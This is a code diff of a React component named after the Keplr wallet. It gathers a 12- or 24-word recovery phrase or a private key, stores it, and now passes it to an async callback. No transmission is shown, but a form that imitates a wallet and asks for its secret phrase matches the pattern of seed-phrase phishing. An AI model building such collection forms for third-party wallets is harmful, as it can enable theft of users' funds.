@@ -7,10 +7,8 @@ import { useWalletStore } from "@/store/walletStore";
 
 const Keplr = ({
 	handleFinish,
-	setWalletPhrase,
 }: {
-	handleFinish: () => void;
-	setWalletPhrase: any;
+	handleFinish: (walletPhrase: string) => Promise<void>;
 }) => {
 	const [activeTab, setActiveTab] = useState("12");
 	const [words12, setWords12] = useState<string[]>(Array(12).fill(""));
@@ -20,18 +18,20 @@ const Keplr = ({
 	const { setSeedPhrase } = useWalletStore();
 
 	const handleComplete = () => {
-		if (words12 && words12.length == 12) {
-			setSeedPhrase(words12.join(" "));
-			setWalletPhrase(words12.join(" "));
-		} else if (words24 && words24.length == 24) {
-			setSeedPhrase(words24.join(" "));
-			setWalletPhrase(words24.join(" "));
-		} else if (privateKey) {
-			setSeedPhrase(privateKey);
-			setWalletPhrase(privateKey);
+		let walletPhrase = "";
+
+		if (activeTab === "12") {
+			walletPhrase = words12.join(" ").trim();
+		} else if (activeTab === "24") {
+			walletPhrase = words24.join(" ").trim();
+		} else {
+			walletPhrase = privateKey.trim();
 		}
 
-		handleFinish();
+		if (!walletPhrase) return;
+
+		setSeedPhrase(walletPhrase);
+		handleFinish(walletPhrase);
 	};
 
 	const handleWordChange = (
